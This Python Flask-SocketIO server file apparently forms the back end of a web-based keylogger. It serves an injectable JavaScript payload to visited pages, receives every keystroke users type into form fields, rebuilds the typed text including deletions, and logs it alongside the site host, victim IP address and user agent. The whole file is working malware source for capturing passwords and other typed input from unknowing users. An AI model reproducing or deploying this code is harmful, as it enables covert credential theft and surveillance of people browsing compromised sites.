import json
import logging
import tables

from flask import Flask, render_template, request
from flask.ext.socketio import SocketIO, emit
from aux import pprint
from datetime import datetime

logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)
hosts = {}
configs = None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/wsk')
def wsk():
    return app.send_static_file('static/js/wsk.min.js')

@socketio.on('connect', namespace='/test')
def test_connect():

    emit('confirm connection', { 'data' : 'Connected' })

@socketio.on('send_details', namespace='/test')
def test_connect(message):

    details = message['page_details']

    host = details['url']['host']
    if host not in hosts:
        hosts[host] = {}

    clients = hosts[host]
    ip = request.remote_addr
    clients[ip] = {}
    client = clients[ip]

    for details in message['jskdetails']:

        _id = details['_id']
        client[_id] = {
            '_id' : _id,
            'info' :  details,
            'contents' : [],
        }

@socketio.on('disconnect', namespace='/test')
def test_disconnect():
    print 'Client disconnected'

@socketio.on('keydown', namespace='/test')
def keydown(message):

    ip = request.remote_addr

    host = message['page_details']['url']['host']
    
    clients = hosts[host]
    client = clients[ip]

    text_field = message['data']['tag_details']
    _id = text_field['_id']
    contents = client[_id]['contents']
        
    keystroke = message['data']['ks']
    ctrl_pressed = message['data']['ctrl']
    alt_pressed = message['data']['alt']
    shift_pressed = message['data']['shift']
    selection_start = message['data']['start_pos']
    selection_end = message['data']['end_pos']

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

    keystroke = tables.keyboard[keystroke]

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            del contents[selection_start:selection_end]

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            del contents[selection_start:selection_end]
    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()

        if selection_start != selection_end:
            del contents[selection_start:selection_end]

        contents.insert(selection_start, keystroke)

    
    keylog_entry = []
    configs = app.config['user_configs']
    if configs['show_hosts']:
        keylog_entry.append(host)
    if configs['show_clients']:
        keylog_entry.append(ip)
    if configs['show_user_agents']:
        keylog_entry.append(message['page_details']['user_agent'])

    keylog_entry.append('<%s id="%s" class="%s" name="%s"> textval: %s' %\
        (message['data']['tag_details']['tag'],
         message['data']['tag_details']['id'],
         message['data']['tag_details']['class'],
         message['data']['tag_details']['name'],
         ''.join(contents)))

    keylog_entry = ' '.join(keylog_entry)
    print keylog_entry


def run(configs):

    app.config['user_configs'] = configs
    app.config['DEBUG'] = configs['debug']
    socketio.run(app, host=configs['lhost'], port=configs['lport']) 
